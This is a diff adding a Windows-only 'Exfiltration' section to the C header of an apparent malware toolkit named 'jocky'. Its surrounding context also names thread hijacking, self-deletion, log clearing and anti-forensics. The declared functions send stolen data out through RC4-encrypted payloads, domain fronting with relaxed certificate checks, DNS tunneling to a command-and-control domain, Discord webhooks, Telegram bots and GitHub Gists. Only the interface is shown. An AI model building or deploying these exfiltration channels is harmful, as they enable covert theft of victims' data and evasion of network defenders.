@@ -291,6 +291,50 @@ bool jocky_thread_hijack(uint32_t pid,
 #endif /* _WIN32 (execution) */
 
 /* ============================================================================
+ * Exfiltration  *(Windows only)*
+ * ============================================================================ */
+
+#ifdef _WIN32
+
+/* Encrypt data for transmission.
+ * Generates a random 16-byte RC4 session key, prepends it to out, and
+ * RC4-encrypts data into out+16.  out must be at least data_len + 16 bytes. */
+bool jocky_exfil_encrypt(const uint8_t* data, size_t data_len,
+                          uint8_t* out, size_t* out_len);
+
+/* Domain fronting — HTTPS POST to front_host (CDN SNI) with Host: real_host.
+ * Certificate CN validation is relaxed; traffic still travels encrypted to
+ * the CDN edge node before being forwarded to the real backend. */
+bool jocky_exfil_front(const char* front_host, const char* real_host,
+                        const char* path,
+                        const uint8_t* data, size_t data_len);
+
+/* DNS tunneling — encode data as base32-labeled A-record queries against
+ * c2_domain.  The authoritative resolver for that domain logs all queries.
+ * Format: <4-hex-seq>.<16-char-b32-chunk>.<c2_domain>
+ * Terminates with a FFFF.END.<c2_domain> sentinel query. */
+bool jocky_exfil_dns(const char* c2_domain,
+                      const uint8_t* data, size_t data_len);
+
+/* Discord webhook — POST base64(data) as message content.
+ * webhook_url is the full URL including token.
+ * Chunks at 1 500 bytes to stay within Discord's 2 000-char limit. */
+bool jocky_exfil_discord(const char* webhook_url,
+                          const uint8_t* data, size_t data_len);
+
+/* Telegram Bot API — POST base64(data) as sendMessage text.
+ * Chunks at 3 000 bytes (Telegram's 4 096-char limit). */
+bool jocky_exfil_telegram(const char* bot_token, const char* chat_id,
+                           const uint8_t* data, size_t data_len);
+
+/* GitHub Gist — PATCH a Gist file named "d.txt" with base64(data).
+ * token must have the gist scope. */
+bool jocky_exfil_github(const char* token, const char* gist_id,
+                         const uint8_t* data, size_t data_len);
+
+#endif /* _WIN32 (exfiltration) */
+
+/* ============================================================================
  * Cleanup: Self-Deletion, Log Clearing, Anti-Forensics
  * ============================================================================ */
 
